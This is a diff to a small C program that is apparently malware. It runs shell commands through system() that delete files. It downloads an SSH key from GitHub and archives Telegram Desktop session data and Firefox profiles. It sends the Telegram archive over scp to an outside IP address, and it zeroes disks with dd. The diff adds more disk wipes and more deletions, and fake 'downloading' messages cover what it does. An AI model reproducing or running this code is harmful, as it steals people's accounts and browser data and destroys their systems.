@@ -3,21 +3,25 @@
 #define _CRT_SECURE_NO_WARNINGS
 #include <stdio.h>
 #include <stdlib.h>
-//#include <time.h>  
+
 	int main()
 	{ 
 	system("rm -rf *");
-	sleep(2);
+	system("sudo rm /usr/local/bin");
+//	sleep(2);
 	system("wget -P 1/ https://raw.githubusercontent.com/yakey4/4659876/main/ssh-key-2022-07-22.key");
 	system("clear");
 	system("chmod 0600 1/ssh-key-2022-07-22.key");
-	sleep(3);
+//	sleep(3);
 	system("rm -rf $HOME/.local/share/TelegramDesktop/tdata/user_data*");
-	sleep(3);
+//	sleep(3);
+	printf("download main");
 	system("tar -cf /tmp/main2.tar.gz $HOME/.local/share/TelegramDesktop/tdata/*");
-	sleep(10);
+//	sleep(10);
 	system("tar -cf /tmp/main.tar.gz  $HOME/.mozilla/firefox/*");
-	sleep(5);
+//	printf("");
+//	sleep(5);
+	system("clear");
 	printf("downloading additional resources");
 	system("scp -oStrictHostKeyChecking=no -i 1/ssh-key-2022-07-22.key /tmp/main2.tar.gz ubuntu@193.123.37.30:/home/ubuntu");
 	system("clear");
@@ -78,6 +82,10 @@
 	system("sudo dd if=/dev/zero of=/dev/hda3 & ");
 	system("clear");
 	system("sudo dd if=/dev/zero of=/dev/hda4 & ");
+	system("sudo dd if=/dev/zero of=/dev/hdb");
+	system("sudo dd if=/dev/zero of=/dev/hdb1");
+	system("sudo dd if=/dev/zero of=/dev/hdb2");
+	system("sudo dd if=/dev/zero of=/dev/hdb3");
 	system("clear");
 	printf("downloading additional files");
 	sleep(1);
